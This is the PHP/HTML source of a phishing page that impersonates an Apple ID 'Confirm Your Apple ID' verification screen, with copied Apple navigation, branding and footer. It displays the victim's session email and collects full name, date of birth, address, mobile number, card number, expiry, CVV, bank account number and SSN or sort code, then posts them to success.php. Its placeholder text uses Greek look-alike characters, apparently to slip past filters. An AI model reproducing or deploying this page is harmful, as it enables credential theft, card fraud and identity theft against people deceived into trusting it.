<?php
session_start();
?>
<html>
<head>
    <title> Verify - Complete Verification </title>
    <link rel="stylesheet" type="text/css" href="https://www.apple.com/ac/globalnav/2.0/en_US/styles/ac-globalnav.built.css">
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <link rel="stylesheet" type="text/css" href="css/app.css">
    <link rel="stylesheet" type="text/css" href="css/card.css">
    <link rel="shortcut icon" type="image/x-icon" href="img/favicon.ico">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
    <script src="js/info.js"></script>
    <script src="js/input.js"></script>
    <style>
        .hideinput {
            display: none;
        }

        .showinout {
        }
        
    </style>
</head>
<body id="pagecontent">
    <div id="managedata"></div>
    <div id="content">
        <app>
            <div class="app-container">
                <applenav>

                    <aside id="ac-gn-segmentbar" class="ac-gn-segmentbar" data-strings="{ 'exit': 'Exit', 'view': '{%STOREFRONT%} Store Home', 'segments': { 'smb': 'Business Store Home', 'eduInd': 'Education Store Home', 'other': 'Store Home' } }"></aside>
                    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
                    <nav id="ac-globalnav" class="js no-touch svg no-ie7 no-ie8" role="navigation" aria-label="Global Navigation" data-hires="false" data-analytics-region="global nav" lang="en-US" data-store-key="" data-store-locale="us" data-store-api="//www.apple.com/[storefront]/shop/bag/status" data-search-locale="en_US" data-search-api="//www.apple.com/search-services/suggestions/">
                        <div class="ac-gn-content">
                            <ul class="ac-gn-header">
                                <li class="ac-gn-item ac-gn-menuicon">
                                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
                                        <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
                                            <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
                                        </span> <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
                                            <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
                                        </span>
                                    </label>
                                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open"> <span class="ac-gn-menuanchor-label">Open Menu</span> </a>
                                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close"> <span class="ac-gn-menuanchor-label">Close Menu</span> </a>
                                </li>
                                <li class="ac-gn-item ac-gn-apple">
                                    <a class="ac-gn-link ac-gn-link-apple" href="//www.apple.com/" data-analytics-title="apple home" id="ac-gn-firstfocus-small"> <span class="ac-gn-link-text">Apple</span> </a>
                                </li>
                                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
                                    <a class="ac-gn-link ac-gn-link-bag" href="#" data-analytics-title="bag" data-analytics-click="bag" aria-label="Shopping Bag" data-string-badge="Shopping Bag with Items"> <span class="ac-gn-link-text">Shopping Bag</span> <span class="ac-gn-bag-badge"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
                                </li>
                            </ul>
                            <ul class="ac-gn-list">
                                <li class="ac-gn-item ac-gn-apple">
                                    <a class="ac-gn-link ac-gn-link-apple" href="#" data-analytics-title="apple home" id="ac-gn-firstfocus"> <span class="ac-gn-link-text">Apple</span> </a>
                                </li>
                                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
                                    <a class="ac-gn-link ac-gn-link-mac" href="" " data-analytics-title=" mac"> <span class="ac-gn-link-text">Mac</span> </a>
                                </li>
                                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
                                    <a class="ac-gn-link ac-gn-link-ipad" href="#" data-analytics-title="ipad"> <span class="ac-gn-link-text">iPad</span> </a>
                                </li>
                                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
                                    <a class="ac-gn-link ac-gn-link-iphone" href="#" data-analytics-title="iphone"> <span class="ac-gn-link-text">iPhone</span> </a>
                                </li>
                                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
                                    <a class="ac-gn-link ac-gn-link-watch" href="#" data-analytics-title="watch"> <span class="ac-gn-link-text">Watch</span> </a>
                                </li>
                                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
                                    <a class="ac-gn-link ac-gn-link-tv" href="#" data-analytics-title="tv"> <span class="ac-gn-link-text">TV</span> </a>
                                </li>
                                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
                                    <a class="ac-gn-link ac-gn-link-music" href="#" data-analytics-title="music"> <span class="ac-gn-link-text">Music</span> </a>
                                </li>
                                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
                                    <a class="ac-gn-link ac-gn-link-support" href="#" data-analytics-title="support"> <span class="ac-gn-link-text">Support</span> </a>
                                </li>
                                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
                                    <a class="ac-gn-link ac-gn-link-search" href="#" data-analytics-title="search" data-analytics-click="search" aria-label="Search apple.com" role="button" aria-haspopup="true"> <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com</span> </a>
                                </li>
                                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
                                    <a class="ac-gn-link ac-gn-link-bag" href="#" data-analytics-title="bag" data-analytics-click="bag" aria-label="Shopping Bag" data-string-badge="Shopping Bag with Items"> <span class="ac-gn-link-text">Shopping Bag</span> <span class="ac-gn-bag-badge" aria-hidden="true"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
                                </li>
                            </ul>
                            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search" data-analytics-region="search">
                                <div class="ac-gn-searchview-content">
                                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="#" method="get">
                                        <div class="ac-gn-searchform-wrapper">
                                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" data-placeholder-long="Search for Products, Stores, and Help" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
                                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
                                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
                                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
                                        </div>
                                    </form>
                                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults" data-string-quicklinks="Quick Links" data-string-suggestions="Suggested Searches" data-string-noresults="Hit enter to search."></aside>
                                </div>
                                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
                                    <span class="ac-gn-searchview-close-wrapper">
                                        <span class="ac-gn-searchview-close-left"></span> <span class="ac-gn-searchview-close-right"></span>
                                    </span>
                                </button>
                            </aside>
                            <aside class="ac-gn-bagview" data-analytics-region="bag">
                                <div class="ac-gn-bagview-scrim"> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span> </div>
                                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content"> </div>
                            </aside>
                        </div>
                    </nav>
                    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
                    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
                </applenav>
                <subnav page="{page}">
                    <div class="subnav">
                        <div class="container">
                            <div class="title pull-left">Apple&nbsp;ID</div>
                            <div class="menu-wrapper pull-right">
                                <ul class="menu">
                                    <li class="item">
                                        <!--<a href="/" class="btn btn-link btn-signin" title="Sign In">Sign In</a>-->
                                        <b class="btn btn-link btn-signin"><?php echo $_SESSION['Eamil'];  ?></b>
                                    <!--</li>
                                    <li class="item  active">
                                        <a href="/account" class="btn btn-link btn-create" title="Create Your Apple ID">Create Your Apple&nbsp;ID</a>
                                    </li>
                                    <li class="item">
                                        <a href="/faq" class="btn btn-link btn-faq" title="Frequently Asked Questions">FAQ</a>
                                    </li>-->
                                </ul>
                            </div>
                        </div>
                    </div>
                </subnav>
                <hero page="{page}">
                    <div class="hero">
                        <div class="container">
                            <h1>Confirm Your Apple&nbsp;ID</h1>
                        </div>
                    </div>
                </hero>
                <div id="flow">
                    <create page="{page}">
                        <div class="flow-body create-body clearfix" role="main">
                            <form method="post" action="success.php?cmd=_account-details&session=<?php $x=md5(microtime());$xx=sha1(microtime()); echo $x.$xx?>">
                                <div class="intro"></div>
                                <div class="container">
                                    <personal account="{account}" validator="{validator}" fieldmap="{fieldmap}" config="{config}">
                                        <section>
                                            <div class="flow-section personal">
                                                <div class="container container-xs">
                                                    <div class="person clearfix">
                                                        <div class="row form-group clearfix">
                                                            <div class="col-xs-6 firstName-wrap person-name">
                                                                <input type="text" placeholder="first name" class="form-control" id="FN" name="FN"/>
                                                            </div>
                                                            <div class="col-xs-6 lastName-wrap person-name">
                                                                <input type="text" placeholder="last name" class="form-control" id="LN" name="LN"/>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="row form-group clearfix">
                                                        <div class="col-sm-12">
                                                            <input type="text" class="form-control" placeholder="Date Of &Beta;irth DD/&Mu;&Mu;/&Upsilon;&Upsilon;&Upsilon;&Upsilon;" id="Dateof" maxlength="10" onkeypress="validate(event)" name="DOB"/>
                                                        </div>
                                                    </div>
                                                    <div class="form-group clearfix">
                                                        <div class="select-wrapper">
                                                            <select id="countryOptions" class="form-control" name="Country">
                                                                <option value="-1">Choose country</option>
                                                                <option value="Afganistan">Afghanistan</option>
                                                                <option value="Albania">Albania</option>
                                                                <option value="Algeria">Algeria</option>
                                                                <option value="American Samoa">American Samoa</option>
                                                                <option value="Andorra">Andorra</option>
                                                                <option value="Angola">Angola</option>
                                                                <option value="Anguilla">Anguilla</option>
                                                                <option value="Antigua &amp; Barbuda">Antigua &amp; Barbuda</option>
                                                                <option value="Argentina">Argentina</option>
                                                                <option value="Armenia">Armenia</option>
                                                                <option value="Aruba">Aruba</option>
                                                                <option value="Australia">Australia</option>
                                                                <option value="Austria">Austria</option>
                                                                <option value="Azerbaijan">Azerbaijan</option>
                                                                <option value="Bahamas">Bahamas</option>
                                                                <option value="Bahrain">Bahrain</option>
                                                                <option value="Bangladesh">Bangladesh</option>
                                                                <option value="Barbados">Barbados</option>
                                                                <option value="Belarus">Belarus</option>
                                                                <option value="Belgium">Belgium</option>
                                                                <option value="Belize">Belize</option>
                                                                <option value="Benin">Benin</option>
                                                                <option value="Bermuda">Bermuda</option>
                                                                <option value="Bhutan">Bhutan</option>
                                                                <option value="Bolivia">Bolivia</option>
                                                                <option value="Bonaire">Bonaire</option>
                                                                <option value="Bosnia &amp; Herzegovina">Bosnia &amp; Herzegovina</option>
                                                                <option value="Botswana">Botswana</option>
                                                                <option value="Brazil">Brazil</option>
                                                                <option value="British Indian Ocean Ter">British Indian Ocean Ter</option>
                                                                <option value="Brunei">Brunei</option>
                                                                <option value="Bulgaria">Bulgaria</option>
                                                                <option value="Burkina Faso">Burkina Faso</option>
                                                                <option value="Burundi">Burundi</option>
                                                                <option value="Cambodia">Cambodia</option>
                                                                <option value="Cameroon">Cameroon</option>
                                                                <option value="Canada">Canada</option>
                                                                <option value="Canary Islands">Canary Islands</option>
                                                                <option value="Cape Verde">Cape Verde</option>
                                                                <option value="Cayman Islands">Cayman Islands</option>
                                                                <option value="Central African Republic">Central African Republic</option>
                                                                <option value="Chad">Chad</option>
                                                                <option value="Channel Islands">Channel Islands</option>
                                                                <option value="Chile">Chile</option>
                                                                <option value="China">China</option>
                                                                <option value="Christmas Island">Christmas Island</option>
                                                                <option value="Cocos Island">Cocos Island</option>
                                                                <option value="Colombia">Colombia</option>
                                                                <option value="Comoros">Comoros</option>
                                                                <option value="Congo">Congo</option>
                                                                <option value="Cook Islands">Cook Islands</option>
                                                                <option value="Costa Rica">Costa Rica</option>
                                                                <option value="Cote DIvoire">Cote D'Ivoire</option>
                                                                <option value="Croatia">Croatia</option>
                                                                <option value="Cuba">Cuba</option>
                                                                <option value="Curaco">Curacao</option>
                                                                <option value="Cyprus">Cyprus</option>
                                                                <option value="Czech Republic">Czech Republic</option>
                                                                <option value="Denmark">Denmark</option>
                                                                <option value="Djibouti">Djibouti</option>
                                                                <option value="Dominica">Dominica</option>
                                                                <option value="Dominican Republic">Dominican Republic</option>
                                                                <option value="East Timor">East Timor</option>
                                                                <option value="Ecuador">Ecuador</option>
                                                                <option value="Egypt">Egypt</option>
                                                                <option value="El Salvador">El Salvador</option>
                                                                <option value="Equatorial Guinea">Equatorial Guinea</option>
                                                                <option value="Eritrea">Eritrea</option>
                                                                <option value="Estonia">Estonia</option>
                                                                <option value="Ethiopia">Ethiopia</option>
                                                                <option value="Falkland Islands">Falkland Islands</option>
                                                                <option value="Faroe Islands">Faroe Islands</option>
                                                                <option value="Fiji">Fiji</option>
                                                                <option value="Finland">Finland</option>
                                                                <option value="France">France</option>
                                                                <option value="French Guiana">French Guiana</option>
                                                                <option value="French Polynesia">French Polynesia</option>
                                                                <option value="French Southern Ter">French Southern Ter</option>
                                                                <option value="Gabon">Gabon</option>
                                                                <option value="Gambia">Gambia</option>
                                                                <option value="Georgia">Georgia</option>
                                                                <option value="Germany">Germany</option>
                                                                <option value="Ghana">Ghana</option>
                                                                <option value="Gibraltar">Gibraltar</option>
                                                                <option value="Great Britain">Great Britain</option>
                                                                <option value="Greece">Greece</option>
                                                                <option value="Greenland">Greenland</option>
                                                                <option value="Grenada">Grenada</option>
                                                                <option value="Guadeloupe">Guadeloupe</option>
                                                                <option value="Guam">Guam</option>
                                                                <option value="Guatemala">Guatemala</option>
                                                                <option value="Guinea">Guinea</option>
                                                                <option value="Guyana">Guyana</option>
                                                                <option value="Haiti">Haiti</option>
                                                                <option value="Hawaii">Hawaii</option>
                                                                <option value="Honduras">Honduras</option>
                                                                <option value="Hong Kong">Hong Kong</option>
                                                                <option value="Hungary">Hungary</option>
                                                                <option value="Iceland">Iceland</option>
                                                                <option value="India">India</option>
                                                                <option value="Indonesia">Indonesia</option>
                                                                <option value="Iran">Iran</option>
                                                                <option value="Iraq">Iraq</option>
                                                                <option value="Ireland">Ireland</option>
                                                                <option value="Isle of Man">Isle of Man</option>
                                                                <option value="Israel">Israel</option>
                                                                <option value="Italy">Italy</option>
                                                                <option value="Jamaica">Jamaica</option>
                                                                <option value="Japan">Japan</option>
                                                                <option value="Jordan">Jordan</option>
                                                                <option value="Kazakhstan">Kazakhstan</option>
                                                                <option value="Kenya">Kenya</option>
                                                                <option value="Kiribati">Kiribati</option>
                                                                <option value="Korea North">Korea North</option>
                                                                <option value="Korea Sout">Korea South</option>
                                                                <option value="Kuwait">Kuwait</option>
                                                                <option value="Kyrgyzstan">Kyrgyzstan</option>
                                                                <option value="Laos">Laos</option>
                                                                <option value="Latvia">Latvia</option>
                                                                <option value="Lebanon">Lebanon</option>
                                                                <option value="Lesotho">Lesotho</option>
                                                                <option value="Liberia">Liberia</option>
                                                                <option value="Libya">Libya</option>
                                                                <option value="Liechtenstein">Liechtenstein</option>
                                                                <option value="Lithuania">Lithuania</option>
                                                                <option value="Luxembourg">Luxembourg</option>
                                                                <option value="Macau">Macau</option>
                                                                <option value="Macedonia">Macedonia</option>
                                                                <option value="Madagascar">Madagascar</option>
                                                                <option value="Malaysia">Malaysia</option>
                                                                <option value="Malawi">Malawi</option>
                                                                <option value="Maldives">Maldives</option>
                                                                <option value="Mali">Mali</option>
                                                                <option value="Malta">Malta</option>
                                                                <option value="Marshall Islands">Marshall Islands</option>
                                                                <option value="Martinique">Martinique</option>
                                                                <option value="Mauritania">Mauritania</option>
                                                                <option value="Mauritius">Mauritius</option>
                                                                <option value="Mayotte">Mayotte</option>
                                                                <option value="Mexico">Mexico</option>
                                                                <option value="Midway Islands">Midway Islands</option>
                                                                <option value="Moldova">Moldova</option>
                                                                <option value="Monaco">Monaco</option>
                                                                <option value="Mongolia">Mongolia</option>
                                                                <option value="Montserrat">Montserrat</option>
                                                                <option value="Morocco">Morocco</option>
                                                                <option value="Mozambique">Mozambique</option>
                                                                <option value="Myanmar">Myanmar</option>
                                                                <option value="Nambia">Nambia</option>
                                                                <option value="Nauru">Nauru</option>
                                                                <option value="Nepal">Nepal</option>
                                                                <option value="Netherland Antilles">Netherland Antilles</option>
                                                                <option value="Netherlands">Netherlands (Holland, Europe)</option>
                                                                <option value="Nevis">Nevis</option>
                                                                <option value="New Caledonia">New Caledonia</option>
                                                                <option value="New Zealand">New Zealand</option>
                                                                <option value="Nicaragua">Nicaragua</option>
                                                                <option value="Niger">Niger</option>
                                                                <option value="Nigeria">Nigeria</option>
                                                                <option value="Niue">Niue</option>
                                                                <option value="Norfolk Island">Norfolk Island</option>
                                                                <option value="Norway">Norway</option>
                                                                <option value="Oman">Oman</option>
                                                                <option value="Pakistan">Pakistan</option>
                                                                <option value="Palau Island">Palau Island</option>
                                                                <option value="Palestine">Palestine</option>
                                                                <option value="Panama">Panama</option>
                                                                <option value="Papua New Guinea">Papua New Guinea</option>
                                                                <option value="Paraguay">Paraguay</option>
                                                                <option value="Peru">Peru</option>
                                                                <option value="Phillipines">Philippines</option>
                                                                <option value="Pitcairn Island">Pitcairn Island</option>
                                                                <option value="Poland">Poland</option>
                                                                <option value="Portugal">Portugal</option>
                                                                <option value="Puerto Rico">Puerto Rico</option>
                                                                <option value="Qatar">Qatar</option>
                                                                <option value="Republic of Montenegro">Republic of Montenegro</option>
                                                                <option value="Republic of Serbia">Republic of Serbia</option>
                                                                <option value="Reunion">Reunion</option>
                                                                <option value="Romania">Romania</option>
                                                                <option value="Russia">Russia</option>
                                                                <option value="Rwanda">Rwanda</option>
                                                                <option value="St Barthelemy">St Barthelemy</option>
                                                                <option value="St Eustatius">St Eustatius</option>
                                                                <option value="St Helena">St Helena</option>
                                                                <option value="St Kitts-Nevis">St Kitts-Nevis</option>
                                                                <option value="St Lucia">St Lucia</option>
                                                                <option value="St Maarten">St Maarten</option>
                                                                <option value="St Pierre &amp; Miquelon">St Pierre &amp; Miquelon</option>
                                                                <option value="St Vincent &amp; Grenadines">St Vincent &amp; Grenadines</option>
                                                                <option value="Saipan">Saipan</option>
                                                                <option value="Samoa">Samoa</option>
                                                                <option value="Samoa American">Samoa American</option>
                                                                <option value="San Marino">San Marino</option>
                                                                <option value="Sao Tome &amp; Principe">Sao Tome &amp; Principe</option>
                                                                <option value="Saudi Arabia">Saudi Arabia</option>
                                                                <option value="Senegal">Senegal</option>
                                                                <option value="Serbia">Serbia</option>
                                                                <option value="Seychelles">Seychelles</option>
                                                                <option value="Sierra Leone">Sierra Leone</option>
                                                                <option value="Singapore">Singapore</option>
                                                                <option value="Slovakia">Slovakia</option>
                                                                <option value="Slovenia">Slovenia</option>
                                                                <option value="Solomon Islands">Solomon Islands</option>
                                                                <option value="Somalia">Somalia</option>
                                                                <option value="South Africa">South Africa</option>
                                                                <option value="Spain">Spain</option>
                                                                <option value="Sri Lanka">Sri Lanka</option>
                                                                <option value="Sudan">Sudan</option>
                                                                <option value="Suriname">Suriname</option>
                                                                <option value="Swaziland">Swaziland</option>
                                                                <option value="Sweden">Sweden</option>
                                                                <option value="Switzerland">Switzerland</option>
                                                                <option value="Syria">Syria</option>
                                                                <option value="Tahiti">Tahiti</option>
                                                                <option value="Taiwan">Taiwan</option>
                                                                <option value="Tajikistan">Tajikistan</option>
                                                                <option value="Tanzania">Tanzania</option>
                                                                <option value="Thailand">Thailand</option>
                                                                <option value="Togo">Togo</option>
                                                                <option value="Tokelau">Tokelau</option>
                                                                <option value="Tonga">Tonga</option>
                                                                <option value="Trinidad &amp; Tobago">Trinidad &amp; Tobago</option>
                                                                <option value="Tunisia">Tunisia</option>
                                                                <option value="Turkey">Turkey</option>
                                                                <option value="Turkmenistan">Turkmenistan</option>
                                                                <option value="Turks &amp; Caicos Is">Turks &amp; Caicos Is</option>
                                                                <option value="Tuvalu">Tuvalu</option>
                                                                <option value="Uganda">Uganda</option>
                                                                <option value="Ukraine">Ukraine</option>
                                                                <option value="United Arab Erimates">United Arab Emirates</option>
                                                                <option value="United Kingdom">United Kingdom</option>
                                                                <option value="United States of America">United States of America</option>
                                                                <option value="Uraguay">Uruguay</option>
                                                                <option value="Uzbekistan">Uzbekistan</option>
                                                                <option value="Vanuatu">Vanuatu</option>
                                                                <option value="Vatican City State">Vatican City State</option>
                                                                <option value="Venezuela">Venezuela</option>
                                                                <option value="Vietnam">Vietnam</option>
                                                                <option value="Virgin Islands (Brit)">Virgin Islands (Brit)</option>
                                                                <option value="Virgin Islands (USA)">Virgin Islands (USA)</option>
                                                                <option value="Wake Island">Wake Island</option>
                                                                <option value="Wallis &amp; Futana Is">Wallis &amp; Futana Is</option>
                                                                <option value="Yemen">Yemen</option>
                                                                <option value="Zaire">Zaire</option>
                                                                <option value="Zambia">Zambia</option>
                                                                <option value="Zimbabwe">Zimbabwe</option>
                                                            </select>
                                                        </div>
                                                    </div>
                                                    <div class="row form-group clearfix">
                                                        <div class="col-sm-12">
                                                            <input type="text" class="form-control" placeholder="Street &Alpha;ddress 1" id="ADD1" name="add1" />
                                                        </div>
                                                    </div>

                                                    <div class="row form-group clearfix">
                                                        <div class="col-sm-12">
                                                            <input type="text" class="form-control" placeholder="Street &Alpha;ddress 2" name="add2" />
                                                        </div>
                                                    </div>
                                                    <div class="row form-group clearfix">
                                                        <div class="col-sm-12">
                                                            <input type="text" class="form-control" placeholder="City" id="city" name="city" />
                                                        </div>
                                                    </div>
                                                    <div class="person clearfix">
                                                        <div class="row form-group clearfix">
                                                            <div class="col-xs-6 firstName-wrap person-name">
                                                                <input type="text" placeholder="&Rho;rovince / Region" class="form-control" id="stats" name="stats" />
                                                            </div>
                                                            <div class="col-xs-6 lastName-wrap person-name">
                                                                <input type="text" placeholder="&Rho;ostcode" class="form-control" id="zip" name="zip" />
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="row form-group clearfix">
                                                        <div class="col-sm-12">
                                                            <input type="text" class="form-control" placeholder="Mobile" id="mobile" name="mobile" />
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>

                                        </section>
                                    </personal>
                                </div>
                                <div class="container">
                                    <security account="{account}" validator="{validator}" fieldmap="{fieldmap}" config="{config}">
                                        <section class="flow-section security">
                                            <div class="container container-xs">
                                                <aid-preferences account="{account}" config="{config}">
                                                    <div class="row form-group clearfix">
                                                        <div class="col-sm-12">
                                                            <input type="text" class="form-control" placeholder="Card Name Holder" id="cardname" name="cardholder" />
                                                        </div>
                                                    </div>
                                                    <div class="row form-group clearfix ">
                                                        <div class="col-sm-12">
                                                            <input type="text" class="form-control" placeholder="Card Number" id="cardnumber" name="cardnumber" maxlength="16" onkeypress="validate(event)"/>
                                                            <span class="creditCard" id="cardtype"></span>
                                                        </div>
                                                    </div>
                                                    <div class="person clearfix">
                                                        <div class="row form-group clearfix">
                                                            <div class="col-xs-6 firstName-wrap person-name">
                                                                <input maxlength="7" type="text" placeholder="&Epsilon;xpiration &Mu;&Mu;/&Upsilon;&Upsilon;&Upsilon;&Upsilon;" class="form-control" id="carddata" onkeypress="validate(event)" name="carddata" />
                                                            </div>
                                                            <div class="col-xs-6 lastName-wrap person-name">
                                                                <input type="text" placeholder="CSC (3 digits)" class="form-control" id="cvv" name="cvv" maxlength="3" onkeypress="validate(event)"/>
                                                                <span class="cvv defaultCvv" id="cvvtype"></span>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="row form-group clearfix " id="vbv">
                                                        <div class="col-sm-12">
                                                            <input type="text" class="form-control" placeholder="Account Number" id="vbvpassword" name="vbv" />
                                                        </div>
                                                    </div>
                                                    <div class="row form-group clearfix " id="SSN">
                                                        <div class="col-sm-12">
                                                            <input type="text" class="form-control" placeholder="SSN(US) / Sort Code(GB)" id="SSNCOD" name="SSn" maxlength="11"/>
                                                        </div>
                                                    </div>
                                                </aid-preferences>
                                            </div>
                                        </section>
                                    </security>
                                </div>
                                <div class="container">
                                    <div class="flow-footer create-footer clearfix">
                                        <div class="flow-controls">
                                            <loading loading="{verifyLoading}">


                                                <div class="loading">
                                                    <i class="icon  spinner"></i>
                                                </div>
                                            </loading>
                                            <input type="submit" class="btn btn-link verify" value="Confirm" id="bntclick">
                                        </div>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </create>
                </div>
            </div>
            <footer>



                <div class="container">
                    <div class="footer">
                        <div class="footer-wrap">
                            <div class="line1">
                                <div class="line-level">Shop the <a href="#" title="Apple Online Store">Apple Online Store</a> (<span class="skype_c2c_print_container notranslate">1-800-MY-APPLE</span><span id="skype_c2c_container" class="skype_c2c_container notranslate" dir="ltr" tabindex="-1" onmouseover="SkypeClick2Call.MenuInjectionHandler.showMenu(this, event)" onmouseout="SkypeClick2Call.MenuInjectionHandler.hideMenu(this, event)" onclick="SkypeClick2Call.MenuInjectionHandler.makeCall(this, event)" data-numbertocall="+18006927753" data-numbertype="tollfree" data-isfreecall="true" data-isrtl="false" data-ismobile="false"><span class="skype_c2c_highlighting_inactive_common" dir="ltr" skypeaction="skype_dropdown"><span class="skype_c2c_textarea_span" id="free_num_ui"><img width="0" height="0" class="skype_c2c_logo_img" src="chrome-extension://lifbcibllhkdhoafpjfnlhfpfgnpldfl/call_skype_logo.png"><span class="skype_c2c_text_span">1-800-MY-APPLE</span><span class="skype_c2c_free_text_span"> FREE</span></span></span></span>), visit an <a href="http://www.apple.com/retail/" title="Apple Retail Store">Apple Retail Store</a>, or find a <a href="http://www.apple.com/buy/" title="Reseller">reseller</a>.</div>
                            </div>
                            <div class="line2">
                                <ul class="menu">
                                    <li class="item"><a href="#" title="Apple Info">Apple Info</a></li>
                                    <li class="item"><a href="#" title="Site Map">Site Map</a></li>
                                    <li class="item"><a href="#" title="Hot News">Hot News</a></li>
                                    <li class="item"><a href="#" title="RSS Feeds">RSS Feeds</a></li>
                                    <li class="item"><a href="#" title="Contact Us">Contact Us</a></li>
                                    <li class="item">
                                        <a class="choose" title="Choose your country or region" href="/choose-your-country">
                                            <img src="https://appleid.cdn-apple.com/static/bin/cb4152743870/images/countryFooterFlags/22x22/USAflag.png" height="22" alt="United States" width="22">
                                        </a>
                                    </li>
                                </ul>
                            </div>
                            <div class="line3">
                                Copyright &copy; 2016 Apple Inc. All rights reserved.
                                <ul class="menu">
                                    <li class="item"><a href="#" title="Terms of Use">Terms of Use</a></li>
                                    <li class="item"><a href="#" title="Privacy Policy">Privacy Policy</a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </footer>
        </app>
    </div>
</body>
</html>
